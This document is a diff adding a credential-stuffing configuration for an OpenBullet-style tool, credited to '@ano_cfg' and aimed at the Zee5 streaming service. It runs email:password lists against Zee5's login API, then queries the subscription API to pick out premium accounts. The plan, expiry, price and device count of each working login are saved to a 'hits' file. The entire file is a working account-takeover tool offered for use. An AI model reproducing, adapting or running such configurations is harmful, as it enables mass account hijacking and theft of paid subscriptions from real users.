@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "Zee5",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-27T23:21:37.4575052+05:30",
+  "AdditionalInfo": "",
+  "Author": "@ano_cfg",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "!!!!!! CONFIG BY @ano_cfg !!!!!!",
+      "VariableName": "",
+      "Id": 1468015907
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://whapi.zee5.com/v1/user/loginemail_v2.php" 
+  CONTENT "{\"email\": \"<USER>\", \"password\": \"<PASS>\",\"guest_token\": \"2bcb373a7cd88c393a8b0ea595055f26\", \"aid\": \"91955485578\", \"lotame_cookie_id\": \"\",\"platform\": \"web\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 181" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://www.zee5.com" 
+  HEADER "referer: https://www.zee5.com/signin" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Mobile Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "The email address and password combination was wrong during login" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"" -> VAR "Tk" "Bearer " "" 
+
+REQUEST GET "https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true" 
+  
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: <Tk>" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "[]" 
+    KEY "<SOURCE>" DoesNotContain "state\":\"activated" 
+  KEYCHAIN Success OR 
+    KEY "state\":\"activated" 
+
+PARSE "<SOURCE>" LR "\"recurring_enabled\":" ",\"" CreateEmpty=FALSE -> CAP "Auto renewal" 
+
+PARSE "<SOURCE>" LR "\"subscription_end\":\"" "T" CreateEmpty=FALSE -> CAP "Expired" 
+
+PARSE "<SOURCE>" LR "\"original_title\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan Type" 
+
+PARSE "<SOURCE>" LR "\"number_of_supported_devices\":" ",\"" CreateEmpty=FALSE -> CAP "DEVICES" 
+
+PARSE "<SOURCE>" LR "\"price\":" ",\"" CreateEmpty=FALSE -> CAP "PRICE" 
+
+FUNCTION Constant "@ano_cfg" -> CAP "Config by" 
+
+UTILITY File "zee5-premium.txt" AppendLines "\\n************** ZEE5 Premium ******************\\n\\n---------------------------------------\\n\\nEmail:Pass :- <USER>:<PASS>\\n\\nPlan = <Plan>\\n\\nExpiry = <Expired>\\n\\nPlan = <Plan Type>\\n\\nAuto-renewal = <Auto renewal>\\n\\nTotal devices = <DEVICES>\\n\\nConfig Made By @ano_cfg\\n\\n---------------------------------------\\n\\n" -> VAR "zee5 hits" 
+
